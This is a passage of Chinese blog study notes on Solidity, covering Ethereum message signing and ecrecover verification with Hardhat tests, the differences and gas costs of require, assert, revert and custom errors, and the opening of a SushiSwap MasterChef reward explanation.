<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20221122181424.png" alt="20221122181424" /></p>
<h1>创建签名:</h1>
<h2 id="打包信息">打包信息:</h2>
<p>在以太坊的ECDSA标准中，被签名的消息是一组数据的<code>keccak256哈希</code>，为<code>bytes32类型</code>。</p>
<p>我们可以把任何想要签名的内容利用<code>abi.encodePacked()</code>函数打包，然后用<code>keccak256()</code>计算哈希，作为消息。<br />
我们例子中的<code>消息</code>由string类型变量得出：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// solidity</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getSingleMessageHash</span>(<span class="params">string memory _message</span>) public pure returns (bytes32)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">keccak256</span>(abi.<span class="title function_">encodePacked</span>(_message));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 测试脚本</span></span><br><span class="line"><span class="title function_">describe</span>(<span class="string">&quot;Verify sign&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  it.<span class="title function_">only</span>(<span class="string">&quot;generate sign&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> &#123;<span class="title class_">Verify</span>, users, tokenOwner&#125; = <span class="keyword">await</span> <span class="title function_">setup</span>();</span><br><span class="line">      <span class="keyword">const</span> message = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">      <span class="comment">// 调用智能合约打包信息</span></span><br><span class="line">      <span class="keyword">let</span> result = <span class="keyword">await</span> <span class="title class_">Verify</span>.<span class="title function_">getSingleMessageHash</span>(message);</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;messageHash: &quot;</span> + result);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 测试脚本输出结果</span></span><br><span class="line">messageHash: 0x1c8aff950685c2ed4bc3174f3472287b56d9517b9c948127319a09a7a36deac8</span><br></pre></td></tr></table></figure>
<blockquote>
<p>打包信息 = <code>abi.encodePacked()</code>打包 + <code>keccak256()</code>计算哈希</p>
</blockquote>
<h2 id="计算以太坊签名消息">计算以太坊签名消息:</h2>
<p><code>消息</code>可以是能被执行的交易，也可以是其他任何形式。<br />
为了避免用户误签了恶意交易，<a href="https://github.com/ethereum/go-ethereum/pull/2940">ethereum PR2940</a>提倡在消息前加上<code>&quot;\x19Ethereum Signed Message:\n32&quot;</code>字符，并再做一次<code>keccak256哈希</code>，作为以太坊签名消息。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// solidity</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">toEthSignedMessageHash</span>(<span class="params">bytes32 hash</span>) public pure returns (bytes32) &#123;</span><br><span class="line">    <span class="comment">// 哈希的长度为32</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">keccak256</span>(abi.<span class="title function_">encodePacked</span>(<span class="string">&quot;\x19Ethereum Signed Message:\n32&quot;</span>, hash));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 测试脚本输出结果</span></span><br><span class="line">sig: 0x456e9aea5e197a1f1af7a3e85a3212fa4049a3ba34c2289b4c860fc0b0c64ef3</span><br></pre></td></tr></table></figure>
<blockquote>
<p>对消息签名 = 签名hash+固定字符串后<code>abi.encodePacked()</code>打包 + <code>keccak256()</code>计算哈希</p>
</blockquote>
<h2 id="钱包进行签名">钱包进行签名:</h2>
<p>日常操作中，大部分用户都是通过这种方式进行签名。</p>
<p>在获取到需要签名的消息之后，我们需要使用metamask钱包进行签名。<br />
metamask的<code>personal_sign</code>方法会自动把消息转换为以太坊签名消息，然后发起签名。</p>
<p>所以我们只需要输入消息和签名者钱包account即可。<br />
需要注意的是输入的签名者钱包account需要和metamask当前连接的account一致才能使用。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Account #18: 0xdD2FD4581271e230360230F9337D5c0430Bf44C0 (10000 ETH)</span></span><br><span class="line"><span class="comment"># Private Key: 0xde9be858da4a475276426320d5e9262ecfc3ba460bfac56360bfa6c4c28b4ee0</span></span><br><span class="line">ethereum.enable()</span><br><span class="line">account = <span class="string">&quot;0xdD2FD4581271e230360230F9337D5c0430Bf44C0&quot;</span></span><br><span class="line"><span class="built_in">hash</span> = <span class="string">&quot;0x1c8aff950685c2ed4bc3174f3472287b56d9517b9c948127319a09a7a36deac8&quot;</span></span><br><span class="line">ethereum.request(&#123;method: <span class="string">&quot;personal_sign&quot;</span>, params: [account, <span class="built_in">hash</span>]&#125;)</span><br></pre></td></tr></table></figure>
<p>在控制台进行输入：<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20221123143209.png" alt="20221123143209" /><br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20221123143228.png" alt="20221123143228" /><br />
在返回的结果中（<code>Promise的PromiseResult</code>）可以看到创建好的签名。不同账户有不同的私钥，创建的签名值也不同。利用上面私钥创建的签名如下所示：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">0x606a2bb1fa3459b622a37b54a88b051ad8d3e0c266373ca3d9a9da3c1b05e0dd4c5c647d72762cb65628ee377a3b9fb1ac09f157d5ae2150c07258117e8a24ae1c</span><br></pre></td></tr></table></figure>
<h2 id="利用ethersjs签名">利用ethersjs签名:</h2>
<p>测试代码地址: <a href="https://github.com/jerrychan807/my-awesome-solidity/blob/main/easy_sign/contracts/Verify.sol">https://github.com/jerrychan807/my-awesome-solidity/blob/main/easy_sign/contracts/Verify.sol</a></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// hardhat测试脚本</span></span><br><span class="line"><span class="title function_">describe</span>(<span class="string">&quot;Verify sign&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// 生成签名</span></span><br><span class="line">  it.<span class="title function_">only</span>(<span class="string">&quot;generate sign&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> &#123;<span class="title class_">Verify</span>, users, tokenOwner&#125; = <span class="keyword">await</span> <span class="title function_">setup</span>();</span><br><span class="line">      <span class="keyword">const</span> provider = <span class="keyword">new</span> ethers.<span class="property">providers</span>.<span class="title class_">JsonRpcProvider</span>(<span class="string">&quot;http://localhost:8545&quot;</span>);</span><br><span class="line">      <span class="keyword">let</span> privateKey = <span class="string">&#x27;0xde9be858da4a475276426320d5e9262ecfc3ba460bfac56360bfa6c4c28b4ee0&#x27;</span>;</span><br><span class="line">      <span class="keyword">let</span> wallet = <span class="keyword">new</span> ethers.<span class="title class_">Wallet</span>(privateKey);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">const</span> message = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;message: &quot;</span> + message);</span><br><span class="line">      <span class="comment">// 打包签名</span></span><br><span class="line">      <span class="keyword">const</span> messageHash = ethers.<span class="property">utils</span>.<span class="title function_">solidityKeccak256</span>([<span class="string">&quot;string&quot;</span>], [message]);</span><br><span class="line">      <span class="keyword">const</span> messageHashByte = ethers.<span class="property">utils</span>.<span class="title function_">arrayify</span>(messageHash);</span><br><span class="line">      <span class="comment">// 消息进行签名</span></span><br><span class="line">      <span class="keyword">let</span> signature = <span class="keyword">await</span> wallet.<span class="title function_">signMessage</span>(messageHashByte);</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;signature: &quot;</span> + signature);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>测试结果如下,与Metamask的消息生成的签名一致。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">message: hello</span><br><span class="line">signature: 0x606a2bb1fa3459b622a37b54a88b051ad8d3e0c266373ca3d9a9da3c1b05e0dd4c5c647d72762cb65628ee377a3b9fb1ac09f157d5ae2150c07258117e8a24ae1c</span><br></pre></td></tr></table></figure>
<h1>验证签名:</h1>
<p>为了验证签名，验证者需要拥有:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>消息</p>
</li>
<li class="lvl-2">
<p>签名</p>
</li>
<li class="lvl-2">
<p>签名使用的公钥。</p>
</li>
</ul>
<p>我们能验证签名的原因是只有私钥的持有者才能够针对交易生成这样的签名，而别人不能。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// solidity</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">verify</span>(<span class="params">address _signer, string memory _message, uint8 _v, bytes32 _r, bytes32 _s</span>) public pure returns (bool) &#123;</span><br><span class="line">    bytes32 msgHash = <span class="title function_">keccak256</span>(abi.<span class="title function_">encodePacked</span>(_message));</span><br><span class="line">    bytes32 msgDigest = <span class="title function_">keccak256</span>(abi.<span class="title function_">encodePacked</span>(<span class="string">&quot;\x19Ethereum Signed Message:\n32&quot;</span>, msgHash));</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">ecrecover</span>(msgDigest, _v, _r, _s) == _signer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>签名中包含<code>r, s, v</code>三个值的信息,通过签名、消息恢复出 签名者的地址。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// hardhat测试脚本</span></span><br><span class="line"><span class="title function_">describe</span>(<span class="string">&quot;Verify sign&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// 生成签名</span></span><br><span class="line">  it.<span class="title function_">only</span>(<span class="string">&quot;generate sign&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> &#123;<span class="title class_">Verify</span>, users, tokenOwner&#125; = <span class="keyword">await</span> <span class="title function_">setup</span>();</span><br><span class="line">      <span class="keyword">const</span> provider = <span class="keyword">new</span> ethers.<span class="property">providers</span>.<span class="title class_">JsonRpcProvider</span>(<span class="string">&quot;http://localhost:8545&quot;</span>);</span><br><span class="line">      <span class="keyword">let</span> privateKey = <span class="string">&#x27;0xde9be858da4a475276426320d5e9262ecfc3ba460bfac56360bfa6c4c28b4ee0&#x27;</span>;</span><br><span class="line">      <span class="keyword">let</span> wallet = <span class="keyword">new</span> ethers.<span class="title class_">Wallet</span>(privateKey);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">const</span> message = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;message: &quot;</span> + message);</span><br><span class="line">      <span class="comment">// 打包签名</span></span><br><span class="line">      <span class="keyword">const</span> messageHash = ethers.<span class="property">utils</span>.<span class="title function_">solidityKeccak256</span>([<span class="string">&quot;string&quot;</span>], [message]);</span><br><span class="line">      <span class="keyword">const</span> messageHashByte = ethers.<span class="property">utils</span>.<span class="title function_">arrayify</span>(messageHash);</span><br><span class="line">      <span class="comment">// 消息进行签名</span></span><br><span class="line">      <span class="keyword">let</span> signature = <span class="keyword">await</span> wallet.<span class="title function_">signMessage</span>(messageHashByte);</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;signature: &quot;</span> + signature);</span><br><span class="line">      <span class="keyword">let</span> sig = ethers.<span class="property">utils</span>.<span class="title function_">splitSignature</span>(signature);</span><br><span class="line">      <span class="comment">// 调用智能合约验证签名</span></span><br><span class="line">      <span class="keyword">let</span> result = <span class="keyword">await</span> <span class="title class_">Verify</span>.<span class="title function_">verify</span>(wallet.<span class="property">address</span>, message, sig.<span class="property">v</span>, sig.<span class="property">r</span>, sig.<span class="property">s</span>);</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>测试结果:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">message: hello</span><br><span class="line">signature: 0x606a2bb1fa3459b622a37b54a88b051ad8d3e0c266373ca3d9a9da3c1b05e0dd4c5c647d72762cb65628ee377a3b9fb1ac09f157d5ae2150c07258117e8a24ae1c</span><br><span class="line"><span class="comment"># 验证通过</span></span><br><span class="line"><span class="literal">true</span></span><br></pre></td></tr></table></figure>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://www.cnblogs.com/wanghui-garcia/p/9642492.html">为什么签名前要加&quot;\x19Ethereum Signed Message:\n&quot;</a></p>
</li>
<li class="lvl-2">
<p><a href="https://soliditydeveloper.com/ecrecover">What is ecrecover in Solidity?</a></p>
</li>
<li class="lvl-2">
<p><a href="https://github.com/AmazingAng/WTF-Solidity/blob/main/37_Signature/readme.md#%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D">WTF Solidity极简入门: 37. 数字签名 Signature</a></p>
</li>
<li class="lvl-2">
<p><a href="https://learnblockchain.cn/article/2701">Solidity中的ecrecover的应用</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>StudyRecord</category>
      </categories>
      <tags>
        <tag>StudyRecord</tag>
        <tag>SmartContract</tag>
      </tags>
  </entry>
  <entry>
    <title>StudyRecord-Solidity异常处理</title>
    <url>/2022/18978.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p><a href="https://github.com/AmazingAng/WTFSolidity/issues/93">require和assert的gas消耗对比问题</a>，学习记录</p>
<p>写智能合约经常会出<code>bug</code>，<code>solidity</code>中的异常命令帮助我们<code>debug</code>，也可以提示用户发生了什么错误。</p>
<p>有4个关键词：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>error</p>
</li>
<li class="lvl-2">
<p>require</p>
</li>
<li class="lvl-2">
<p>assert</p>
</li>
<li class="lvl-2">
<p>revert</p>
</li>
</ul>
<h1>error:</h1>
<p><code>error</code>是<code>solidity 0.8</code>版本新加的内容，方便且高效（省<code>gas</code>）地向用户解释操作失败的原因。人们可以在contract之外定义异常。(模块化的前提，代码更易读)</p>
<h2 id="使用方法">使用方法:</h2>
<p>下面，我们定义一个<code>TransferNotOwner</code>异常，当用户不是代币<code>owner</code>的时候尝试转账，会抛出错误：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">error <span class="title class_">TransferNotOwner</span>(); <span class="comment">// 自定义error</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在执行当中，error必须搭配revert（回退）命令使用。</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">transferOwner1</span>(<span class="params">uint256 tokenId, address newOwner</span>) public &#123;</span><br><span class="line">        <span class="keyword">if</span>(_owners[tokenId] != msg.<span class="property">sender</span>)&#123;</span><br><span class="line">            revert <span class="title class_">TransferNotOwner</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        _owners[tokenId] = newOwner;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h1>require:</h1>
<p><code>require</code> is used to validate inputs and conditions before execution<br />
用于在代码执行之前验证输入和条件，常见3种使用场景：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>外部input的参数</p>
</li>
<li class="lvl-2">
<p>在执行某段逻辑前，判断条件（条件很多，要通过测试不断补充）</p>
</li>
<li class="lvl-2">
<p>其他函数的返回值</p>
</li>
</ul>
<p><code>require</code>命令是<code>solidity 0.8</code>版本之前抛出异常的常用方法，目前很多主流合约仍然还在使用它。</p>
<p>缺点就是<code>gas</code>随着描述异常的字符串长度增加，比<code>error</code>命令要高。</p>
<h2 id="使用方法-2">使用方法:</h2>
<p><code>require(检查条件，&quot;异常的描述&quot;)</code>，当检查条件不成立的时候，就会抛出异常。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">transferOwner2</span>(<span class="params">uint256 tokenId, address newOwner</span>) public &#123;</span><br><span class="line">    <span class="built_in">require</span>(_owners[tokenId] == msg.<span class="property">sender</span>, <span class="string">&quot;Transfer Not Owner&quot;</span>);</span><br><span class="line">    _owners[tokenId] = newOwner;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Uni例子">Uni例子:</h2>
<p>看看成熟代码里怎么用</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/// @inheritdoc IUniswapV3Factory</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createPool</span>(<span class="params"></span></span><br><span class="line"><span class="params">    address tokenA,</span></span><br><span class="line"><span class="params">    address tokenB,</span></span><br><span class="line"><span class="params">    uint24 fee</span></span><br><span class="line"><span class="params"></span>) external override noDelegateCall returns (address pool) &#123;</span><br><span class="line">    <span class="built_in">require</span>(tokenA != tokenB);</span><br><span class="line">    (address token0, address token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA);</span><br><span class="line">    <span class="built_in">require</span>(token0 != <span class="title function_">address</span>(<span class="number">0</span>));</span><br><span class="line">    int24 tickSpacing = feeAmountTickSpacing[fee];</span><br><span class="line">    <span class="built_in">require</span>(tickSpacing != <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">require</span>(getPool[token0][token1][fee] == <span class="title function_">address</span>(<span class="number">0</span>));</span><br><span class="line">    pool = <span class="title function_">deploy</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>), token0, token1, fee, tickSpacing);</span><br><span class="line">    getPool[token0][token1][fee] = pool;</span><br><span class="line">    <span class="comment">// populate mapping in the reverse direction, deliberate choice to avoid the cost of comparing addresses</span></span><br><span class="line">    getPool[token1][token0][fee] = pool;</span><br><span class="line">    emit <span class="title class_">PoolCreated</span>(token0, token1, fee, tickSpacing, pool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/// @inheritdoc IUniswapV3Factory</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">setOwner</span>(<span class="params">address _owner</span>) external override &#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.<span class="property">sender</span> == owner);</span><br><span class="line">    emit <span class="title class_">OwnerChanged</span>(owner, _owner);</span><br><span class="line">    owner = _owner;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>revert:</h1>
<p><code>revert</code> 类似 <code>require</code>，相比可选填写异常描述的<code>require</code>，准确的描述会更user friendly，但遇到复杂的检验条件时，会选用<code>revert</code>.</p>
<h1>assert:</h1>
<p><code>assert</code> is used to check for code that should never be false.<br />
Failing assertion probably means that there is a bug.</p>
<p>断言真假，常用于<code>after execution</code>的位置</p>
<p>使用场景：一般用于用于内部错误检查或去检查一些不变量，因为它不能解释抛出异常的原因,所以不是对外使用的，是在内部使用的。</p>
<h2 id="使用方法-3">使用方法:</h2>
<p>它的用法很简单，assert(检查条件），当检查条件不成立的时候，就会抛出异常。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">transferOwner3</span>(<span class="params">uint256 tokenId, address newOwner</span>) public &#123;</span><br><span class="line">    <span class="title function_">assert</span>(_owners[tokenId] == msg.<span class="property">sender</span>);</span><br><span class="line">    _owners[tokenId] = newOwner;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Uni例子-2">Uni例子:</h2>
<p>看看成熟代码里怎么用</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">check_liquidityNet_invariant</span>(<span class="params"></span>) internal &#123;</span><br><span class="line">    int128 liquidityNet = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (uint256 i = <span class="number">0</span>; i &lt; usedTicks.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        (, int128 tickLiquidityNet, , ) = pool.<span class="title function_">ticks</span>(usedTicks[i]);</span><br><span class="line">        int128 result = liquidityNet + tickLiquidityNet;</span><br><span class="line">        <span class="title function_">assert</span>(</span><br><span class="line">            (tickLiquidityNet &gt;= <span class="number">0</span> &amp;&amp; result &gt;= liquidityNet) || (tickLiquidityNet &lt; <span class="number">0</span> &amp;&amp; result &lt; liquidityNet)</span><br><span class="line">        );</span><br><span class="line">        liquidityNet = result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prop #20  常用于尾部，执行逻辑后</span></span><br><span class="line">    <span class="title function_">assert</span>(liquidityNet == <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">check_liquidity_invariant</span>(<span class="params"></span>) internal &#123;</span><br><span class="line">    (, int24 currentTick, , , , , ) = pool.<span class="title function_">slot0</span>();</span><br><span class="line"></span><br><span class="line">    int128 liquidity = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (uint256 i = <span class="number">0</span>; i &lt; usedTicks.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        int24 tick = usedTicks[i];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (tick &lt;= currentTick) &#123;</span><br><span class="line">            (, int128 tickLiquidityNet, , ) = pool.<span class="title function_">ticks</span>(tick);</span><br><span class="line"></span><br><span class="line">            int128 result = liquidity + tickLiquidityNet;</span><br><span class="line">            <span class="title function_">assert</span>((tickLiquidityNet &gt;= <span class="number">0</span> &amp;&amp; result &gt;= liquidity) || (tickLiquidityNet &lt; <span class="number">0</span> &amp;&amp; result &lt; liquidity));</span><br><span class="line">            liquidity = result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prop #21</span></span><br><span class="line">    <span class="title function_">assert</span>(<span class="title function_">uint128</span>(liquidity) == pool.<span class="title function_">liquidity</span>());</span><br><span class="line">    <span class="title function_">assert</span>(liquidity &gt;= <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>gas对比:</h1>
<p>基于<a href="https://github.com/AmazingAng/WTFSolidity/blob/main/15_Errors/Error.sol">代码</a>,简单对比,好像没啥意义。。。😨😨😨<br />
仅仅是小小gas优化的，单个交易看不出啥，multi tx才能看出来。</p>
<table>
<thead>
<tr>
<th>Keyword</th>
<th>gas</th>
</tr>
</thead>
<tbody>
<tr>
<td>require</td>
<td>24440</td>
</tr>
<tr>
<td>assert</td>
<td>24446</td>
</tr>
<tr>
<td>error</td>
<td>24457</td>
</tr>
<tr>
<td>require带异常描述字符串</td>
<td>24743</td>
</tr>
</tbody>
</table>
<h1>Question</h1>
<h2 id="Q1-revert返还gas吗">Q1: revert返还gas吗?</h2>
<blockquote>
<p>理论上require的报错会将余下的gas返回给user，而assert会全部没收，而15_Error中实验结果，是assert比require更少的损耗，问题出在哪里? —— <a href="https://github.com/AmazingAng/WTFSolidity/issues/93">issue</a></p>
</blockquote>
<p>群友回复:</p>
<p>0.8版本之前 <code>assert()</code>会消耗完所有gas</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220714140615.png" alt="20220714140615" /></p>
<p>0.8版本后assert(）在编译时将操作码从<code>FE</code>改为了<code>FD</code>不会消耗完gas</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220714140629.png" alt="20220714140629" /></p>
<p><a href="https://learnblockchain.cn/docs/solidity/080-breaking-changes.html">Solidity v0.8.0 重大更新</a>：</p>
<blockquote>
<p>Failing <code>assertions</code> and other internal checks like division by zero or arithmetic overflow do not use the <code>invalid opcode</code> but instead the <code>revert opcode</code></p>
<p>This will save gas on errors</p>
</blockquote>
<p>assert的操作码改变了：<code>invalid opcode</code> -&gt;<code>revert opcode</code>,会返还<code>gas</code></p>
<h2 id="Q2-require带错误描述为啥更耗gas">Q2: require带错误描述为啥更耗gas?</h2>
<p><code>ErrorRequire.evm</code> Vs <code>ErrorRequireText.evm</code></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220714142719.png" alt="20220714142719" /></p>
<blockquote>
<p>所有命运赠送的礼物，早已在暗中标好了价格 —— 茨威格</p>
</blockquote>
<p>每个opcode都有其gas price,多了字符串要存储，就多了opcode,就多了gas</p>
<h1>Summary:</h1>
<table>
<thead>
<tr>
<th>Keyword</th>
<th>特点</th>
<th>使用场景</th>
</tr>
</thead>
<tbody>
<tr>
<td>require</td>
<td>外部输入，before execution</td>
<td>1.外部input的参数 2.在执行某段逻辑前判断条件 3.其他函数的返回值</td>
</tr>
<tr>
<td>error</td>
<td>升级版require,错误可模块化</td>
<td>—</td>
</tr>
<tr>
<td>revert</td>
<td>偷懒版require不写异常描述，复杂的检验条件</td>
<td>复杂的检验条件</td>
</tr>
<tr>
<td>assert</td>
<td>断言真假，after execution</td>
<td>常用于func尾部</td>
</tr>
</tbody>
</table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function (input):</span><br><span class="line">   |</span><br><span class="line">   |</span><br><span class="line">require/升级用error/偷懒用revert</span><br><span class="line">   |</span><br><span class="line">   | before execution</span><br><span class="line">   |</span><br><span class="line">   | 某个函数() / 某段执行逻辑</span><br><span class="line">   |</span><br><span class="line">   | after execution</span><br><span class="line">   |</span><br><span class="line">assert 断言某些输出真假</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>输入用<code>require</code></p>
</li>
<li class="lvl-2">
<p>升级用<code>Error</code></p>
</li>
<li class="lvl-2">
<p>偷懒用<code>revert</code></p>
</li>
<li class="lvl-2">
<p>输出用<code>assert</code> 😋😋😋</p>
</li>
</ul>
<p>opcode大法好: 0.8.0版本前后，assert的操作码改变了：<code>invalid opcode</code> -&gt;<code>revert opcode</code>,会返还<code>gas</code></p>
<p>给自己的建议：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>多看英文资料，中文资料有毒，思路好乱 🤪🤪🤪</p>
</li>
<li class="lvl-2">
<p>学语法就学语法，要注重使用场景，多写多使用，gas优化这类进阶知识，要学了evm、opcode先</p>
</li>
<li class="lvl-2">
<p>多积累基础知识，少超前诠释知识</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220714144530.png" alt="20220714144530" /></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>除了细读文档，还要看看版本更新了啥新特性，太难了</p>
</li>
<li class="lvl-2">
<p>新版本出的新特性优先使用，既省gas，又可以将错误模块化，不用满天星<code>require</code>语句。双倍快乐😁😁😁</p>
</li>
<li class="lvl-2">
<p>change view step by step，think step ↓</p>
</li>
<li class="lvl-2">
<p>evm、opcode大法好 🤙</p>
</li>
</ul>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://github.com/AmazingAng/WTFSolidity/tree/main/15_Errors">Solidity极简入门: 15. 异常</a></p>
</li>
<li class="lvl-2">
<p><a href="https://github.com/djrtwo/evm-opcode-gas-costs/blob/master/opcode-gas-costs_EIP-150_revision-1e18248_2017-04-12.csv">evm-opcode-gas-costs</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>StudyRecord</category>
      </categories>
      <tags>
        <tag>StudyRecord</tag>
        <tag>SmartContract</tag>
      </tags>
  </entry>
  <entry>
    <title>StudyRecord-SushiSwap_MasterChef质押收益计算原理</title>
    <url>/2022/49924.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>学习下如何计算挖矿收益的源码：<a href="https://github.com/sushiswap/sushiswap/blob/archieve%2Fcanary/contracts/MasterChef.sol">MasterChef.sol</a></p>
<blockquote>
<p>The MasterChef gives out a constant number of SUSHI per block, for liquidity providers that stake SLP tokens within contract.</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p>奖励从哪来？</p>
</li>
</ul>
<p>主厨每个区块都给出固定的<code>sushi</code>数量，<code>mint</code>铸造出来的，0地址凭空增发出来😆😆😆</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>奖励怎么分配？</p>
</li>
</ul>
<p>按质押本金的比例分配给流动性提供者,每区块的奖励是固定的，大户质押的本金多，获得的奖励多</p>
<h1>简单模拟奖励:</h1>
<p>先自己模拟计算一下</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">RewardsPerBlock</span> = <span class="number">1</span>$</span><br><span class="line"><span class="title class_">On</span> block <span class="number">0</span>, <span class="title class_">Staker</span> A deposits $<span class="number">100</span></span><br><span class="line"><span class="title class_">On</span> block <span class="number">10</span>, <span class="title class_">Staker</span> B deposits $<span class="number">100</span></span><br><span class="line"><span class="title class_">On</span> block <span class="number">15</span>, <span class="title class_">Staker</span> A harvests all rewards</span><br><span class="line"><span class="title class_">On</span> block <span class="number">25</span>, <span class="title class_">Staker</span> B harvests all rewards</span><br><span class="line"><span class="title class_">On</span> block <span class="number">30</span>, both stakers harvests all rewards.</span><br></pre></td></tr></table></figure>
<p>前10个区块，用户A独享全部奖励即10$</p>
